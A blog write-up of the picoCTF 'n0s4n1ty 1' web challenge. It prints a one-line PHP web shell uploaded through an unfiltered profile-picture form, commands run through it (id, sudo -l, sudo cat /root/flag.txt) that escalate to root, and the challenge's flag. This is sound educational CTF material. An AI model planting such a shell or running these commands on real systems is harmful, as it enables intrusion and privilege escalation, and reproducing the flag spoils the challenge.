---
slug: "picoctf-n0s4n1ty-file-upload-rce"
title: "picoCTF n0s4n1ty 1: File Upload to RCE to Root"
date: "2025-10-06"
category: "ctf"
tags:
  - "CTF"
  - "Web Security"
  - "picoCTF"
  - "RCE"
  - "File Upload"
excerpt: "An unfiltered profile-picture upload takes a PHP web shell, and a sudo misconfiguration turns www-data into root."
readTime: "1 min"
featured: true
---

### Challenge: n0s4n1ty 1

Category: Web Exploitation
Goal: Get RCE through profile picture upload, escalate to root, and retrieve /root/flag.txt.

### 🔍 Step-by-Step Exploit Path

1. Recon and Source Discovery

Found file upload form → upload.php

![picoCTF n0s4n1ty 1: File Upload to RCE to Root — figure 1](/images/blog/picoctf-n0s4n1ty-file-upload-rce/figure1.png)

HTML showed no client-side filtering

Hints confirmed: input not sanitized

2. Upload PHP Web Shell

```
Payload: <?php system($_GET['cmd']); ?>
```

Uploaded successfully as uploads/image.php

![picoCTF n0s4n1ty 1: File Upload to RCE to Root — figure 2](/images/blog/picoctf-n0s4n1ty-file-upload-rce/figure2.png)

I then uploaded a php payload

![picoCTF n0s4n1ty 1: File Upload to RCE to Root — figure 3](/images/blog/picoctf-n0s4n1ty-file-upload-rce/figure3.png)

Triggered with:
.../image.php?cmd=id

![picoCTF n0s4n1ty 1: File Upload to RCE to Root — figure 4](/images/blog/picoctf-n0s4n1ty-file-upload-rce/figure4.png)

Result: ✅ RCE as www-data

3. Privilege Escalation – from the hiints given

Used:
.../image.php?cmd=sudo+-l

Result:

(ALL) NOPASSWD: ALL

![picoCTF n0s4n1ty 1: File Upload to RCE to Root — figure 5](/images/blog/picoctf-n0s4n1ty-file-upload-rce/figure5.png)

## → Full root access available with no password

4. Flag Capture – I had to craft a payload to retrieve the flag located in the root directory (from description)

Command used:

## .../image.php?cmd=sudo+cat+/root/flag.txt

Result:

![picoCTF n0s4n1ty 1: File Upload to RCE to Root — figure 6](/images/blog/picoctf-n0s4n1ty-file-upload-rce/figure6.png)

```
Flag: picoCTF{wh47_c4n_u_d0_wPHP_56060bd8}
```

## 🧠 Lessons Learned

Always check upload endpoints for file extension bypasses

```
PHP is dangerous if system(), shell_exec(), or eval() are exposed
RCE can be chained with sudo misconfig to get full root access
```

A simple web shell can take you all the way to root
